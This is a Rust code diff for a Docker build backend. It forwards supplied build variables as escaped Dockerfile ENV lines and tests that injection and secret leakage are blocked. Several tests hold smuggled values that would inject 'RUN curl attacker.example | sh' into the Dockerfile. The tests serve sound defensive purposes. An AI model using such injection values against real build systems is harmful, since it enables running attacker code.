@@ -111,6 +111,63 @@ ENV PATH=\"/mise/shims:$PATH\"
 RUN curl https://mise.run | sh
 ";
 
+fn environment_contents(
+    operation: &OperationContext,
+    build_env: &IndexMap<String, String>,
+) -> String {
+    let mut contents = String::new();
+    for (name, value) in build_env {
+        if !crate::sdk::is_valid_env_name(name) {
+            operation.emit(crate::event::Event::Diagnostic {
+                level: crate::event::DiagnosticLevel::Warning,
+                message: format!(
+                    "Skipping environment variable {name:?}: a name must be letters, digits and underscores, and cannot start with a digit"
+                ),
+            });
+            continue;
+        }
+        if name == "PATH" {
+            operation.emit(crate::event::Event::Diagnostic {
+                level: crate::event::DiagnosticLevel::Warning,
+                message:
+                    "Ignoring PATH: the build image sets its own; use a plan path step to extend it"
+                        .to_owned(),
+            });
+            continue;
+        }
+        // A newline cannot be carried on a single ENV line.
+        if value.contains('\n') || value.contains('\r') {
+            operation.emit(crate::event::Event::Diagnostic {
+                level: crate::event::DiagnosticLevel::Warning,
+                message: format!(
+                    "Skipping environment variable {name}: values containing line breaks cannot be passed to a Docker build"
+                ),
+            });
+            continue;
+        }
+        contents.push_str(&format!(
+            "ENV {name}=\"{}\"\n",
+            escape_environment_value(value)
+        ));
+    }
+    contents
+}
+
+/// Escape a value for a double-quoted Dockerfile `ENV` instruction.
+///
+/// An unescaped `"` would end the instruction early and let the rest inject
+/// further directives; `$` is escaped so values are taken literally.
+fn escape_environment_value(value: &str) -> String {
+    let mut escaped = String::with_capacity(value.len());
+    for character in value.chars() {
+        if matches!(character, '\\' | '"' | '$') {
+            escaped.push('\\');
+        }
+        escaped.push(character);
+    }
+    escaped
+}
+
 /// Python's `Path.absolute()`: prefix with the cwd, no normalization.
 fn absolute_path(path: &Path) -> PathBuf {
     if path.is_absolute() {
@@ -233,10 +290,12 @@ impl DockerBuildBackend {
     fn dockerfile_contents(
         &self,
         env: &mut IndexMap<String, String>,
+        build_env: &IndexMap<String, String>,
         mounts: &[Mount],
         steps: &[Step],
     ) -> Result<String> {
         let mut docker_file_contents = String::from(DOCKERFILE_HEADER);
+        docker_file_contents.push_str(&environment_contents(&self.operation, build_env));
 
         for mount in mounts {
             docker_file_contents.push_str(&format!(
@@ -377,6 +436,7 @@ impl BuildBackend for DockerBuildBackend {
         &mut self,
         name: &str,
         env: &IndexMap<String, String>,
+        build_env: &IndexMap<String, String>,
         mounts: &[Mount],
         steps: &[Step],
     ) -> Result<()> {
@@ -388,7 +448,7 @@ impl BuildBackend for DockerBuildBackend {
         // dict. The only observable side channel is the runtime PATH,
         // surfaced through `get_runtime_path`.
         let mut env = env.clone();
-        let docker_file_contents = self.dockerfile_contents(&mut env, mounts, steps)?;
+        let docker_file_contents = self.dockerfile_contents(&mut env, build_env, mounts, steps)?;
 
         self.runtime_path = env.get("PATH").cloned();
 
@@ -548,7 +608,7 @@ mod tests {
             .into_iter()
             .collect();
         let contents = backend
-            .dockerfile_contents(&mut env, &mounts, &steps)
+            .dockerfile_contents(&mut env, &IndexMap::new(), &mounts, &steps)
             .unwrap();
 
         assert!(contents.starts_with(
@@ -590,6 +650,142 @@ mod tests {
     }
 
     #[test]
+    fn test_dockerfile_contents_forwards_supplied_build_variables() {
+        let tmp = tempfile::tempdir().unwrap();
+        let backend = backend(tmp.path());
+
+        let build_env: IndexMap<String, String> = [
+            (
+                "PUBLIC_API_URL".to_owned(),
+                "https://api.example".to_owned(),
+            ),
+            ("ANYBUILD_PHP_VERSION".to_owned(), "8.3".to_owned()),
+        ]
+        .into_iter()
+        .collect();
+
+        let contents = backend
+            .dockerfile_contents(&mut IndexMap::new(), &build_env, &[], &[])
+            .unwrap();
+
+        assert!(contents.contains("ENV PUBLIC_API_URL=\"https://api.example\"\n"));
+        assert!(contents.contains("ENV ANYBUILD_PHP_VERSION=\"8.3\"\n"));
+        let env_at = contents.find("ENV PUBLIC_API_URL=").unwrap();
+        assert!(env_at > contents.find("RUN curl https://mise.run | sh").unwrap());
+    }
+
+    #[test]
+    fn test_dockerfile_contents_never_forwards_the_process_environment() {
+        let tmp = tempfile::tempdir().unwrap();
+        let backend = backend(tmp.path());
+
+        let mut process_env: IndexMap<String, String> = [
+            ("GITHUB_TOKEN".to_owned(), "ghp_secret".to_owned()),
+            ("AWS_SECRET_ACCESS_KEY".to_owned(), "aws-secret".to_owned()),
+            ("NPM_TOKEN".to_owned(), "npm-secret".to_owned()),
+            ("HOME".to_owned(), "/home/builder".to_owned()),
+        ]
+        .into_iter()
+        .collect();
+
+        let contents = backend
+            .dockerfile_contents(&mut process_env, &IndexMap::new(), &[], &[])
+            .unwrap();
+
+        for leaked in [
+            "GITHUB_TOKEN",
+            "AWS_SECRET_ACCESS_KEY",
+            "NPM_TOKEN",
+            "HOME=",
+        ] {
+            assert!(
+                !contents.contains(leaked),
+                "{leaked} reached the build:\n{contents}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_dockerfile_contents_rejects_names_that_would_inject_instructions() {
+        let tmp = tempfile::tempdir().unwrap();
+        let backend = backend(tmp.path());
+
+        let build_env: IndexMap<String, String> = [
+            (
+                "SAFE value\nRUN curl attacker.example | sh #".to_owned(),
+                "x".to_owned(),
+            ),
+            ("HAS SPACES".to_owned(), "x".to_owned()),
+            ("9_LEADING_DIGIT".to_owned(), "x".to_owned()),
+            ("".to_owned(), "x".to_owned()),
+            ("KEPT_NAME".to_owned(), "kept".to_owned()),
+        ]
+        .into_iter()
+        .collect();
+
+        let contents = backend
+            .dockerfile_contents(&mut IndexMap::new(), &build_env, &[], &[])
+            .unwrap();
+
+        assert!(!contents.contains("RUN curl attacker.example | sh"));
+        assert!(!contents.contains("HAS SPACES"));
+        assert!(!contents.contains("9_LEADING_DIGIT"));
+        assert!(contents.contains("ENV KEPT_NAME=\"kept\"\n"));
+    }
+
+    /// The plan is authoritative, so its `ENV` line must come last.
+    #[test]
+    fn test_dockerfile_contents_lets_plan_env_override_supplied_variables() {
+        let tmp = tempfile::tempdir().unwrap();
+        let backend = backend(tmp.path());
+
+        let build_env: IndexMap<String, String> =
+            [("NODE_ENV".to_owned(), "development".to_owned())]
+                .into_iter()
+                .collect();
+        let steps = vec![Step::Env(EnvStep {
+            variables: [("NODE_ENV".to_owned(), "production".to_owned())]
+                .into_iter()
+                .collect(),
+        })];
+
+        let contents = backend
+            .dockerfile_contents(&mut IndexMap::new(), &build_env, &[], &steps)
+            .unwrap();
+
+        let supplied = contents.find("ENV NODE_ENV=\"development\"").unwrap();
+        let planned = contents.find("ENV NODE_ENV=production").unwrap();
+        assert!(planned > supplied);
+    }
+
+    #[test]
+    fn test_dockerfile_contents_escapes_supplied_values() {
+        let tmp = tempfile::tempdir().unwrap();
+        let backend = backend(tmp.path());
+
+        let build_env: IndexMap<String, String> = [
+            (
+                "INJECTED".to_owned(),
+                "\"\nRUN curl attacker.example | sh\nENV X=\"".to_owned(),
+            ),
+            ("LITERAL".to_owned(), "cost $PATH \\ backslash".to_owned()),
+            ("PATH".to_owned(), "/attacker/bin".to_owned()),
+        ]
+        .into_iter()
+        .collect();
+
+        let contents = backend
+            .dockerfile_contents(&mut IndexMap::new(), &build_env, &[], &[])
+            .unwrap();
+
+        assert!(!contents.contains("RUN curl attacker.example | sh"));
+        assert!(!contents.contains("ENV INJECTED="));
+        assert!(!contents.contains("/attacker/bin"));
+        assert!(contents.contains("ENV PATH=\"/mise/shims:$PATH\"\n"));
+        assert!(contents.contains("ENV LITERAL=\"cost \\$PATH \\\\ backslash\"\n"));
+    }
+
+    #[test]
     fn test_dockerfile_asset_errors() {
         let tmp = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(tmp.path().join("assets").join("dir")).unwrap();
@@ -598,6 +794,7 @@ mod tests {
 
         let missing = backend.dockerfile_contents(
             &mut env,
+            &IndexMap::new(),
             &[],
             &[Step::Copy(CopyStep {
                 source: "missing.txt".to_owned(),
@@ -614,6 +811,7 @@ mod tests {
 
         let dir = backend.dockerfile_contents(
             &mut env,
+            &IndexMap::new(),
             &[],
             &[Step::Copy(CopyStep {
                 source: "dir".to_owned(),
@@ -637,6 +835,7 @@ mod tests {
         let contents = backend
             .dockerfile_contents(
                 &mut env,
+                &IndexMap::new(),
                 &[],
                 &[Step::Copy(CopyStep {
                     source: "https://example.com/x.tar.gz".to_owned(),
